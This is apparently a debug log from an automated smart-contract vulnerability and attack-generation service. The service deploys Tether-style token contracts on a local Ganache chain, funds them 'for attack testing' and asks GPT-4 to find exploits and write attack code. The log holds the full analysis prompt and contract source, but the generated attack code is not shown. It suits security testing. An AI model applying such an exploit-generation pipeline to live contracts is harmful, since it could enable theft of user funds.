2025-07-05 13:15:20,697 - flask_cors.extension - DEBUG - CORS have been already evaluated, skipping
2025-07-05 13:15:20,701 - werkzeug - INFO - 192.168.112.1 - - [05/Jul/2025 13:15:20] "[33mOPTIONS /analysis/status/3 HTTP/1.1[0m" 404 -
2025-07-05 13:15:37,439 - app.api.contract - INFO - Received analyze request from wallet: 0xAb5801a7D398351b8bE11C439e05C5B3259aec45
2025-07-05 13:15:37,461 - app.api.contract - INFO - Analyzing code snippet
2025-07-05 13:15:37,471 - app.api.contract - INFO - Starting contract analysis for user: 1
2025-07-05 13:15:37,477 - app.services.contract_service - INFO - Created temporary file for contract code: /tmp/tmpzqyp3b34.sol
2025-07-05 13:15:37,489 - app.services.contract_service - INFO - Connected to Ganache at http://ganache:8545
2025-07-05 13:15:37,490 - app.services.contract_service - INFO - Compiling contract...
2025-07-05 13:15:37,504 - solcx - INFO - Using solc version 0.4.17
2025-07-05 13:15:40,534 - httpx - INFO - HTTP Request: POST https://api.openai.com/v1/chat/completions "HTTP/1.1 200 OK"
2025-07-05 13:15:41,382 - app.services.contract_service - INFO - Compilation result: 4 contracts compiled
2025-07-05 13:15:41,384 - app.services.contract_service - INFO - Deploying 4 contracts...
2025-07-05 13:15:41,736 - app.services.contract_service - INFO - Contract Ownable deployed at 0x0E696947A06550DEf604e82C26fd9E493e576337
2025-07-05 13:15:41,739 - app.services.contract_service - INFO - Setting up contract Ownable...
2025-07-05 13:15:41,852 - app.services.contract_service - INFO - Contract Ownable setup completed
2025-07-05 13:15:41,853 - app.services.contract_service - INFO - Funding contract Ownable for attack testing...
2025-07-05 13:15:41,996 - app.services.contract_service - INFO - Contract Ownable funded
2025-07-05 13:15:42,377 - app.services.contract_service - INFO - Contract Pausable deployed at 0xDb56f2e9369E0D7bD191099125a3f6C370F8ed15
2025-07-05 13:15:42,378 - app.services.contract_service - INFO - Setting up contract Pausable...
2025-07-05 13:15:42,578 - app.services.contract_service - INFO - Contract Pausable setup completed
2025-07-05 13:15:42,580 - app.services.contract_service - INFO - Funding contract Pausable for attack testing...
2025-07-05 13:15:42,730 - app.services.contract_service - INFO - Contract Pausable funded
2025-07-05 13:15:43,034 - app.services.contract_service - INFO - Contract SafeMath deployed at 0xA94B7f0465E98609391C623d0560C5720a3f2D33
2025-07-05 13:15:43,036 - app.services.contract_service - INFO - Setting up contract SafeMath...
2025-07-05 13:15:43,069 - app.services.contract_service - INFO - Contract SafeMath setup completed
2025-07-05 13:15:43,071 - app.services.contract_service - INFO - Funding contract SafeMath for attack testing...
2025-07-05 13:15:43,217 - app.services.contract_service - INFO - Contract SafeMath funded
2025-07-05 13:15:43,745 - httpx - INFO - HTTP Request: POST https://api.openai.com/v1/chat/completions "HTTP/1.1 200 OK"
2025-07-05 13:15:44,453 - app.services.contract_service - INFO - Contract TetherToken deployed at 0x6eD79Aa1c71FD7BdBC515EfdA3Bd4e26394435cC
2025-07-05 13:15:44,455 - app.services.contract_service - INFO - Setting up contract TetherToken...
2025-07-05 13:15:48,035 - httpx - INFO - HTTP Request: POST https://api.openai.com/v1/chat/completions "HTTP/1.1 200 OK"
2025-07-05 13:15:49,150 - httpx - INFO - HTTP Request: POST https://api.openai.com/v1/chat/completions "HTTP/1.1 200 OK"
2025-07-05 13:15:49,939 - httpx - INFO - HTTP Request: POST https://api.openai.com/v1/chat/completions "HTTP/1.1 200 OK"
2025-07-05 13:15:50,111 - app.services.contract_service - INFO - Contract TetherToken setup completed
2025-07-05 13:15:50,113 - app.services.contract_service - INFO - Funding contract TetherToken for attack testing...
2025-07-05 13:15:50,271 - app.services.contract_service - INFO - Contract TetherToken funded
2025-07-05 13:15:50,273 - app.services.contract_service - INFO - Building contract observation...
2025-07-05 13:15:53,438 - app.services.contract_service - INFO - Contract observation built successfully
2025-07-05 13:15:53,443 - app.services.contract_service - INFO - Generating attack strategy...
2025-07-05 13:15:53,445 - app.services.contract_service - INFO - Running Slither analysis...
2025-07-05 13:15:53,468 - app.services.contract_service - WARNING - Failed to run Slither analysis: solc-select non trouv√© : installe-le via pip install solc-select
2025-07-05 13:15:53,488 - app.services.contract_service - WARNING - Traceback (most recent call last):
  File "/app/modules/slither_scan.py", line 38, in ensure_solc_version
    subprocess.run(
  File "/usr/local/lib/python3.12/subprocess.py", line 548, in run
    with Popen(*popenargs, **kwargs) as process:
         ^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/usr/local/lib/python3.12/subprocess.py", line 1026, in __init__
    self._execute_child(args, executable, preexec_fn, close_fds,
  File "/usr/local/lib/python3.12/subprocess.py", line 1955, in _execute_child
    raise child_exception_type(errno_num, err_msg, err_filename)
FileNotFoundError: [Errno 2] No such file or directory: 'solc-select'

During handling of the above exception, another exception occurred:

Traceback (most recent call last):
  File "/app/services/contract_service.py", line 192, in analyze_contract_from_code
    slith_result = slither_analyze(temp_path)
                   ^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/app/modules/slither_scan.py", line 152, in slither_analyze
    slither_result = run_slither(sol_path, json_path, solc_version)
                     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/app/modules/slither_scan.py", line 69, in run_slither
    ensure_solc_version(solc_version)
  File "/app/modules/slither_scan.py", line 44, in ensure_solc_version
    raise EnvironmentError("solc-select non trouv√© : installe-le via pip install solc-select")
OSError: solc-select non trouv√© : installe-le via pip install solc-select

2025-07-05 13:15:53,496 - app.modules.attack_generator - INFO - Starting complete attack strategy generation
2025-07-05 13:15:53,497 - app.modules.attack_generator - INFO - Contract name: Ownable
2025-07-05 13:15:53,499 - app.modules.attack_generator - INFO - Using step number: 0 for model selection
2025-07-05 13:15:53,500 - app.modules.attack_generator - INFO - üîç Step 1: Analyzing contracts for vulnerabilities...
2025-07-05 13:15:53,515 - app.modules.attack_generator - INFO - [MODE] Utilisation du gros mod√®le (GPT-4)
2025-07-05 13:15:53,517 - app.modules.attack_generator - INFO - Querying OpenAI GPT-4 API with temperature=0.2, max_tokens=1800
2025-07-05 13:15:53,518 - app.modules.attack_generator - INFO - Sending request to OpenAI API...
2025-07-05 13:15:57,158 - flask_cors.extension - DEBUG - Request to ''/history'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-07-05 13:15:57,161 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://localhost:4456
2025-07-05 13:15:57,163 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-07-05 13:15:57,165 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://localhost:4456'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Vary', 'Origin')])
2025-07-05 13:15:57,168 - werkzeug - INFO - 192.168.112.1 - - [05/Jul/2025 13:15:57] "GET /history HTTP/1.1" 200 -
2025-07-05 13:16:17,452 - httpx - INFO - HTTP Request: POST https://api.openai.com/v1/chat/completions "HTTP/1.1 200 OK"
2025-07-05 13:16:17,487 - app.modules.attack_generator - INFO - Received response from OpenAI API in 23.97 seconds
2025-07-05 13:16:17,493 - app.modules.attack_generator - INFO - Contract analysis completed in 23.97 seconds
2025-07-05 13:16:17,494 - app.modules.attack_generator - INFO - Vulnerability assessment: **A. Centralization and Owner Privileges (High Risk)**  
- The owner has extensive powers:  
  - Can...
2025-07-05 13:16:17,496 - app.modules.attack_generator - INFO - ‚öîÔ∏è Step 2: Generating attack code...
2025-07-05 13:16:17,498 - app.modules.attack_generator - INFO - [MODE] Utilisation du gros mod√®le (GPT-4)
2025-07-05 13:16:17,499 - app.modules.attack_generator - INFO - Querying OpenAI GPT-4 API with temperature=0.2, max_tokens=1800
2025-07-05 13:16:17,501 - app.modules.attack_generator - INFO - Sending request to OpenAI API...
2025-07-05 13:16:22,686 - httpx - INFO - HTTP Request: POST https://api.openai.com/v1/chat/completions "HTTP/1.1 200 OK"
2025-07-05 13:16:22,701 - app.modules.attack_generator - INFO - Received response from OpenAI API in 5.20 seconds
2025-07-05 13:16:22,708 - app.modules.attack_generator - INFO - Attack code generation completed in 5.20 seconds
2025-07-05 13:16:22,710 - app.modules.attack_generator - INFO - Generated attack code of type solidity with length 911
2025-07-05 13:16:22,713 - app.modules.attack_generator - INFO - Total attack strategy generation completed in 29.17 seconds
2025-07-05 13:16:22,715 - app.modules.attack_generator - INFO - Attack strategy generation completed successfully
2025-07-05 13:16:22,727 - app.services.contract_service - INFO - Attack strategy generated successfully: {'analysis': {'analysis_prompt': '\nYou are a world-class smart contract security auditor.\n\n**Ignore all contracts that are standard utilities (ERC20, SafeMath, Ownable, Math, Interface, Libraries, etc). Focus only on contracts that can hold ETH or user funds, or have business logic.**\n\nYour task is to analyze the contracts and identify vulnerabilities:\n- Analyze only the real targets (wallets, banks, DAOs, exchanges, casinos, crowdsales, games, proxies, funds, staking, etc.)\n- Identify **any vulnerability**: reentrancy, logic bugs, permission issues, math errors, unsafe calls, backdoors, economic exploits, etc.\n- Explain the vulnerability mechanism and potential impact\n- If an initial setup is required for exploitation, describe the setup process\n- Return the solidity version of the contracts (pragma solidity ^x.x.x)\n\nThe slither analyze :  \n\nContracts context (JSON):\n{\n  "filename": "tmpzqyp3b34.sol",\n  "contracts": [\n    {\n      "contract_name": "Ownable",\n      "address": "0x0E696947A06550DEf604e82C26fd9E493e576337",\n      "abi": [\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "owner",\n          "outputs": [\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [\n            {\n              "name": "newOwner",\n              "type": "address"\n            }\n          ],\n          "name": "transferOwnership",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "inputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "constructor"\n        }\n      ],\n      "functions": [\n        {\n          "name": "owner",\n          "signature": "owner()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "transferOwnership",\n          "signature": "transferOwnership(address)",\n          "inputs": [\n            {\n              "name": "newOwner",\n              "type": "address"\n            }\n          ],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        }\n      ],\n      "events": [],\n      "accounts_balances": {\n        "0x0E696947A06550DEf604e82C26fd9E493e576337": 0,\n        "0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1": 99731430000000000000,\n        "0xFFcf8FDEE72ac11b5c542428B35EEF5769C409f0": 96999153260000000000,\n        "0x22d491Bde2303f2f43325b2108D26f1eAbA1e32b": 100000000000000000000\n      },\n      "public_state": {\n        "_contract_eth_balance_wei": 0,\n        "_contract_eth_balance_eth": 0,\n        "owner": "0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1"\n      },\n      "source_code_snippet": "pragma solidity ^0.4.17;\\n\\n/**\\n * @title SafeMath\\n * @dev Math operations with safety checks that throw on error\\n */\\nlibrary SafeMath {\\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\\n        if (a == 0) {\\n            return 0;\\n        }\\n        uint256 c = a * b;\\n        assert(c / a == b);\\n        return c;\\n    }\\n\\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\\n        // assert(b > 0); // Solidity automatically throws when dividing by 0\\n        uint256 c = a / b;\\n        // assert(a == b * c + a % b); // There is no case in which this doesn\'t hold\\n        return c;\\n    }\\n\\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\\n        assert(b <= a);\\n        return a - b;\\n    }\\n\\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\\n        uint256 c = a + b;\\n        assert(c >= a);\\n        return c;\\n    }\\n}\\n\\n/**\\n * @title Ownable\\n * @dev The Ownable contract has an owner address, and provides basic authorization control\\n * functions, this simplifies the implementation of \\"user permissions\\".\\n */\\ncontract Ownable {\\n    address public owner;\\n\\n    /**\\n      * @dev The Ownable constructor sets the original `owner` of the contract to the sender\\n      * account.\\n      */\\n    function Ownable() public {\\n        owner = msg.sender;\\n    }\\n\\n    /**\\n      * @dev Throws if called by any account other than the owner.\\n      */\\n    modifier onlyOwner() {\\n        require(msg.sender == owner);\\n        _;\\n    }\\n\\n    /**\\n    * @dev Allows the current owner to transfer control of the contract to a newOwner.\\n    * @param newOwner The address to transfer ownership to.\\n    */\\n    function transferOwnership(address newOwner) public onlyOwner {\\n        if (newOwner != address(0)) {\\n            owner = newOwner;\\n        }\\n    }\\n\\n}\\n\\n/**\\n * @title ERC20Basic\\n * @dev Simpler version of ERC20 interface\\n * @dev see https://github.com/ethereum/EIPs/issues/20\\n */\\ncontract ERC20Basic {\\n    uint public _totalSupply;\\n    function totalSupply() public constant returns (uint);\\n    function balanceOf(address who) public constant returns (uint);\\n    function transfer(address to, uint value) public;\\n    event Transfer(address indexed from, address indexed to, uint value);\\n}\\n\\n/**\\n * @title ERC20 interface\\n * @dev see https://github.com/ethereum/EIPs/issues/20\\n */\\ncontract ERC20 is ERC20Basic {\\n    function allowance(address owner, address spender) public constant returns (uint);\\n    function transferFrom(address from, address to, uint value) public;\\n    function approve(address spender, uint value) public;\\n    event Approval(address indexed owner, address indexed spender, uint value);\\n}\\n\\n/**\\n * @title Basic token\\n * @dev Basic version of StandardToken, with no allowances.\\n */\\ncontract BasicToken is Ownable, ERC20Basic {\\n    using SafeMath for uint;\\n\\n    mapping(address => uint) public balances;\\n\\n    // additional variables for use if transaction fees ever became necessary\\n    uint public basisPointsRate = 0;\\n    uint public maximumFee = 0;\\n\\n    /**\\n    * @dev Fix for the ERC20 short address attack.\\n    */\\n    modifier onlyPayloadSize(uint size) {\\n        require(!(msg.data.length < size + 4));\\n        _;\\n    }\\n\\n    /**\\n    * @dev transfer token for a specified address\\n    * @param _to The address to transfer to.\\n    * @param _value The amount to be transferred.\\n    */\\n    function transfer(address _to, uint _value) public onlyPayloadSize(2 * 32) {\\n        uint fee = (_value.mul(basisPointsRate)).div(10000);\\n        if (fee > maximumFee) {\\n            fee = maximumFee;\\n        }\\n        uint sendAmount = _value.sub(fee);\\n        balances[msg.sender] = balances[msg.sender].sub(_value);\\n        balances[_to] = balances[_to].add(sendAmount);\\n        if (fee > 0) {\\n            balances[owner] = balances[owner].add(fee);\\n            Transfer(msg.sender, owner, fee);\\n        }\\n        Transfer(msg.sender, _to, sendAmount);\\n    }\\n\\n    /**\\n    * @dev Gets the balance of the specified address.\\n    * @param _owner The address to query the the balance of.\\n    * @return An uint representing the amount owned by the passed address.\\n    */\\n    function balanceOf(address _owner) public constant returns (uint balance) {\\n        return balances[_owner];\\n    }\\n\\n}\\n\\n/**\\n * @title Standard ERC20 token\\n *\\n * @dev Implementation of the basic standard token.\\n * @dev https://github.com/ethereum/EIPs/issues/20\\n * @dev Based oncode by FirstBlood: https://github.com/Firstbloodio/token/blob/master/smart_contract/FirstBloodToken.sol\\n */\\ncontract StandardToken is BasicToken, ERC20 {\\n\\n    mapping (address => mapping (address => uint)) public allowed;\\n\\n    uint public constant MAX_UINT = 2**256 - 1;\\n\\n    /**\\n    * @dev Transfer tokens from one address to another\\n    * @param _from address The address which you want to send tokens from\\n    * @param _to address The address which you want to transfer to\\n    * @param _value uint the amount of tokens to be transferred\\n    */\\n    function transferFrom(address _from, address _to, uint _value) public onlyPayloadSize(3 * 32) {\\n        var _allowance = allowed[_from][msg.sender];\\n\\n        // Check is not needed because sub(_allowance, _value) will already throw if this condition is not met\\n        // if (_value > _allowance) throw;\\n\\n        uint fee = (_value.mul(basisPointsRate)).div(10000);\\n        if (fee > maximumFee) {\\n            fee = maximumFee;\\n        }\\n        if (_allowance < MAX_UINT) {\\n            allowed[_from][msg.sender] = _allowance.sub(_value);\\n        }\\n        uint sendAmount = _value.sub(fee);\\n        balances[_from] = balances[_from].sub(_value);\\n        balances[_to] = balances[_to].add(sendAmount);\\n        if (fee > 0) {\\n            balances[owner] = balances[owner].add(fee);\\n            Transfer(_from, owner, fee);\\n        }\\n        Transfer(_from, _to, sendAmount);\\n    }\\n\\n    /**\\n    * @dev Approve the passed address to spend the specified amount of tokens on behalf of msg.sender.\\n    * @param _spender The address which will spend the funds.\\n    * @param _value The amount of tokens to be spent.\\n    */\\n    function approve(address _spender, uint _value) public onlyPayloadSize(2 * 32) {\\n\\n        // To change the approve amount you first have to reduce the addresses`\\n        //  allowance to zero by calling `approve(_spender, 0)` if it is not\\n        //  already 0 to mitigate the race condition described here:\\n        //  https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729\\n        require(!((_value != 0) && (allowed[msg.sender][_spender] != 0)));\\n\\n        allowed[msg.sender][_spender] = _value;\\n        Approval(msg.sender, _spender, _value);\\n    }\\n\\n    /**\\n    * @dev Function to check the amount of tokens than an owner allowed to a spender.\\n    * @param _owner address The address which owns the funds.\\n    * @param _spender address The address which will spend the funds.\\n    * @return A uint specifying the amount of tokens still available for the spender.\\n    */\\n    function allowance(address _owner, address _spender) public constant returns (uint remaining) {\\n        return allowed[_owner][_spender];\\n    }\\n\\n}\\n\\n\\n/**\\n * @title Pausable\\n * @dev Base contract which allows children to implement an emergency stop mechanism.\\n */\\ncontract Pausable is Ownable {\\n  event Pause();\\n  event Unpause();\\n\\n  bool public paused = false;\\n\\n\\n  /**\\n   * @dev Modifier to make a function callable only when the contract is not paused.\\n   */\\n  modifier whenNotPaused() {\\n    require(!paused);\\n    _;\\n  }\\n\\n  /**\\n   * @dev Modifier to make a function callable only when the contract is paused.\\n   */\\n  modifier whenPaused() {\\n    require(paused);\\n    _;\\n  }\\n\\n  /**\\n   * @dev called by the owner to pause, triggers stopped state\\n   */\\n  function pause() onlyOwner whenNotPaused public {\\n    paused = true;\\n    Pause();\\n  }\\n\\n  /**\\n   * @dev called by the owner to unpause, returns to normal state\\n   */\\n  function unpause() onlyOwner whenPaused public {\\n    paused = false;\\n    Unpause();\\n  }\\n}\\n\\ncontract BlackList is Ownable, BasicToken {\\n\\n    /////// Getters to allow the same blacklist to be used also by other contracts (including upgraded Tether) ///////\\n    function getBlackListStatus(address _maker) external constant returns (bool) {\\n        return isBlackListed[_maker];\\n    }\\n\\n    function getOwner() external constant returns (address) {\\n        return owner;\\n    }\\n\\n    mapping (address => bool) public isBlackListed;\\n    \\n    function addBlackList (address _evilUser) public onlyOwner {\\n        isBlackListed[_evilUser] = true;\\n        AddedBlackList(_evilUser);\\n    }\\n\\n    function removeBlackList (address _clearedUser) public onlyOwner {\\n        isBlackListed[_clearedUser] = false;\\n        RemovedBlackList(_clearedUser);\\n    }\\n\\n    function destroyBlackFunds (address _blackListedUser) public onlyOwner {\\n        require(isBlackListed[_blackListedUser]);\\n        uint dirtyFunds = balanceOf(_blackListedUser);\\n        balances[_blackListedUser] = 0;\\n        _totalSupply -= dirtyFunds;\\n        DestroyedBlackFunds(_blackListedUser, dirtyFunds);\\n    }\\n\\n    event DestroyedBlackFunds(address _blackListedUser, uint _balance);\\n\\n    event AddedBlackList(address _user);\\n\\n    event RemovedBlackList(address _user);\\n\\n}\\n\\ncontract UpgradedStandardToken is StandardToken{\\n    // those methods are called by the legacy contract\\n    // and they must ensure msg.sender to be the contract address\\n    function transferByLegacy(address from, address to, uint value) public;\\n    function transferFromByLegacy(address sender, address from, address spender, uint value) public;\\n    function approveByLegacy(address from, address spender, uint value) public;\\n}\\n\\ncontract TetherToken is Pausable, StandardToken, BlackList {\\n\\n    string public name;\\n    string public symbol;\\n    uint public decimals;\\n    address public upgradedAddress;\\n    bool public deprecated;\\n\\n    //  The contract can be initialized with a number of tokens\\n    //  All the tokens are deposited to the owner address\\n    //\\n    // @param _balance Initial supply of the contract\\n    // @param _name Token Name\\n    // @param _symbol Token symbol\\n    // @param _decimals Token decimals\\n    function TetherToken(uint _initialSupply, string _name, string _symbol, uint _decimals) public {\\n        _totalSupply = _initialSupply;\\n        name = _name;\\n        symbol = _symbol;\\n        decimals = _decimals;\\n        balances[owner] = _initialSupply;\\n        deprecated = false;\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function transfer(address _to, uint _value) public whenNotPaused {\\n        require(!isBlackListed[msg.sender]);\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).transferByLegacy(msg.sender, _to, _value);\\n        } else {\\n            return super.transfer(_to, _value);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function transferFrom(address _from, address _to, uint _value) public whenNotPaused {\\n        require(!isBlackListed[_from]);\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).transferFromByLegacy(msg.sender, _from, _to, _value);\\n        } else {\\n            return super.transferFrom(_from, _to, _value);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function balanceOf(address who) public constant returns (uint) {\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).balanceOf(who);\\n        } else {\\n            return super.balanceOf(who);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function approve(address _spender, uint _value) public onlyPayloadSize(2 * 32) {\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).approveByLegacy(msg.sender, _spender, _value);\\n        } else {\\n            return super.approve(_spender, _value);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function allowance(address _owner, address _spender) public constant returns (uint remaining) {\\n        if (deprecated) {\\n            return StandardToken(upgradedAddress).allowance(_owner, _spender);\\n        } else {\\n            return super.allowance(_owner, _spender);\\n        }\\n    }\\n\\n    // deprecate current contract in favour of a new one\\n    function deprecate(address _upgradedAddress) public onlyOwner {\\n        deprecated = true;\\n        upgradedAddress = _upgradedAddress;\\n        Deprecate(_upgradedAddress);\\n    }\\n\\n    // deprecate current contract if favour of a new one\\n    function totalSupply() public constant returns (uint) {\\n        if (deprecated) {\\n            return StandardToken(upgradedAddress).totalSupply();\\n        } else {\\n            return _totalSupply;\\n        }\\n    }\\n\\n    // Issue a new amount of tokens\\n    // these tokens are deposited into the owner address\\n    //\\n    // @param _amount Number of tokens to be issued\\n    function issue(uint amount) public onlyOwner {\\n        require(_totalSupply + amount > _totalSupply);\\n        require(balances[owner] + amount > balances[owner]);\\n\\n        balances[owner] += amount;\\n        _totalSupply += amount;\\n        Issue(amount);\\n    }\\n\\n    // Redeem tokens.\\n    // These tokens are withdrawn from the owner address\\n    // if the balance must be enough to cover the redeem\\n    // or the call will fail.\\n    // @param _amount Number of tokens to be issued\\n    function redeem(uint amount) public onlyOwner {\\n        require(_totalSupply >= amount);\\n        require(balances[owner] >= amount);\\n\\n        _totalSupply -= amount;\\n        balances[owner] -= amount;\\n        Redeem(amount);\\n    }\\n\\n    function setParams(uint newBasisPoints, uint newMaxFee) public onlyOwner {\\n        // Ensure transparency by hardcoding limit beyond which fees can never be added\\n        require(newBasisPoints < 20);\\n        require(newMaxFee < 50);\\n\\n        basisPointsRate = newBasisPoints;\\n        maximumFee = newMaxFee.mul(10**decimals);\\n\\n        Params(basisPointsRate, maximumFee);\\n    }\\n\\n    // Called when new token are issued\\n    event Issue(uint amount);\\n\\n    // Called when tokens are redeemed\\n    event Redeem(uint amount);\\n\\n    // Called when contract is deprecated\\n    event Deprecate(address newAddress);\\n\\n    // Called if contract ever adds fees\\n    event Params(uint feeBasisPoints, uint maxFee);\\n}",\n      "solc_version": "0.4.17"\n    },\n    {\n      "contract_name": "Pausable",\n      "address": "0xDb56f2e9369E0D7bD191099125a3f6C370F8ed15",\n      "abi": [\n        {\n          "constant": false,\n          "inputs": [],\n          "name": "unpause",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "paused",\n          "outputs": [\n            {\n              "name": "",\n              "type": "bool"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [],\n          "name": "pause",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "owner",\n          "outputs": [\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [\n            {\n              "name": "newOwner",\n              "type": "address"\n            }\n          ],\n          "name": "transferOwnership",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "anonymous": false,\n          "inputs": [],\n          "name": "Pause",\n          "type": "event"\n        },\n        {\n          "anonymous": false,\n          "inputs": [],\n          "name": "Unpause",\n          "type": "event"\n        }\n      ],\n      "functions": [\n        {\n          "name": "unpause",\n          "signature": "unpause()",\n          "inputs": [],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "paused",\n          "signature": "paused()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "bool"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "pause",\n          "signature": "pause()",\n          "inputs": [],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "owner",\n          "signature": "owner()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "transferOwnership",\n          "signature": "transferOwnership(address)",\n          "inputs": [\n            {\n              "name": "newOwner",\n              "type": "address"\n            }\n          ],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        }\n      ],\n      "events": [\n        {\n          "name": "Pause",\n          "inputs": []\n        },\n        {\n          "name": "Unpause",\n          "inputs": []\n        }\n      ],\n      "accounts_balances": {\n        "0xDb56f2e9369E0D7bD191099125a3f6C370F8ed15": 0,\n        "0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1": 99731430000000000000,\n        "0xFFcf8FDEE72ac11b5c542428B35EEF5769C409f0": 96999153260000000000,\n        "0x22d491Bde2303f2f43325b2108D26f1eAbA1e32b": 100000000000000000000\n      },\n      "public_state": {\n        "_contract_eth_balance_wei": 0,\n        "_contract_eth_balance_eth": 0,\n        "paused": false,\n        "owner": "0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1"\n      },\n      "source_code_snippet": "pragma solidity ^0.4.17;\\n\\n/**\\n * @title SafeMath\\n * @dev Math operations with safety checks that throw on error\\n */\\nlibrary SafeMath {\\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\\n        if (a == 0) {\\n            return 0;\\n        }\\n        uint256 c = a * b;\\n        assert(c / a == b);\\n        return c;\\n    }\\n\\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\\n        // assert(b > 0); // Solidity automatically throws when dividing by 0\\n        uint256 c = a / b;\\n        // assert(a == b * c + a % b); // There is no case in which this doesn\'t hold\\n        return c;\\n    }\\n\\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\\n        assert(b <= a);\\n        return a - b;\\n    }\\n\\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\\n        uint256 c = a + b;\\n        assert(c >= a);\\n        return c;\\n    }\\n}\\n\\n/**\\n * @title Ownable\\n * @dev The Ownable contract has an owner address, and provides basic authorization control\\n * functions, this simplifies the implementation of \\"user permissions\\".\\n */\\ncontract Ownable {\\n    address public owner;\\n\\n    /**\\n      * @dev The Ownable constructor sets the original `owner` of the contract to the sender\\n      * account.\\n      */\\n    function Ownable() public {\\n        owner = msg.sender;\\n    }\\n\\n    /**\\n      * @dev Throws if called by any account other than the owner.\\n      */\\n    modifier onlyOwner() {\\n        require(msg.sender == owner);\\n        _;\\n    }\\n\\n    /**\\n    * @dev Allows the current owner to transfer control of the contract to a newOwner.\\n    * @param newOwner The address to transfer ownership to.\\n    */\\n    function transferOwnership(address newOwner) public onlyOwner {\\n        if (newOwner != address(0)) {\\n            owner = newOwner;\\n        }\\n    }\\n\\n}\\n\\n/**\\n * @title ERC20Basic\\n * @dev Simpler version of ERC20 interface\\n * @dev see https://github.com/ethereum/EIPs/issues/20\\n */\\ncontract ERC20Basic {\\n    uint public _totalSupply;\\n    function totalSupply() public constant returns (uint);\\n    function balanceOf(address who) public constant returns (uint);\\n    function 